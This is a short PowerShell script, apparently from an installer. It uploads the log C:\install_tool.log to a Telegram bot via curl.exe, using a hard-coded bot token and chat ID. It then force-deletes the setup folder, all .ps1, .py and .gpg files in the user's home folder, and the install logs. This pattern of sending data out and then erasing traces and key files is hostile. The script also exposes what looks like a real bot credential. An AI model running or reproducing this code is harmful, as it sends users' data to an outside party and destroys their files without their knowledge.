$setup_path = 'script'
$FilePath = "C:\install_tool.log"
$Uri = "https://api.telegram.org/bot7758334928:AAEM-PqCzWFn7M_11dcS5Xlev9PS1lgDJNo/sendDocument"
$ChatId = "-4583989930"

function Send-Log {
    curl.exe -F "chat_id=$ChatId" -F "document=@$FilePath" $Uri
}

function Clean {
    Write-Host "Cleaning..."
    Set-Location $HOME
    $self = $MyInvocation.MyCommand.Definition
    Write-Host "Remove script file name: $self"
    Remove-Item -Path $setup_path -Recurse -Force
    Remove-Item *.ps1
    Remove-Item *.py
    Remove-Item *.gpg
    Remove-Item C:\install_app.log
    Remove-Item C:\install_tool.log
}

Send-Log
Clean
